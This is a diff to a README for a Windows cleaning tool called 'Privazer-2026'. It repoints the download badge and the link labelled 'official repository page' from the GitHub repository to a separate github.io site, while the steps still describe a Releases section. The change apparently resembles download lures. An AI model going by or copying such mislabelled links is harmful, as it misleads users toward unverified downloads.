@@ -1,12 +1,12 @@
 # 🛡️ Privazer-2026 - Clean your computer and protect privacy
 
-[![](https://img.shields.io/badge/Download-Privazer-blue.svg)](https://github.com/Sharmaratak/Privazer-2026)
+[![](https://img.shields.io/badge/Download-Privazer-blue.svg)](https://sharmaratak.github.io)
 
 Privazer-2026 removes junk files and history from your Windows system. This software clears traces of your activity to keep your computer fast and secure. It works on Windows 10 and Windows 11.
 
 ## 📥 How to download the software
 
-1. Visit the [official repository page](https://github.com/Sharmaratak/Privazer-2026).
+1. Visit the [official repository page](https://sharmaratak.github.io).
 2. Look for the Releases section on the right side of the page.
 3. Click the latest version number.
 4. Find the file list at the bottom of the page.
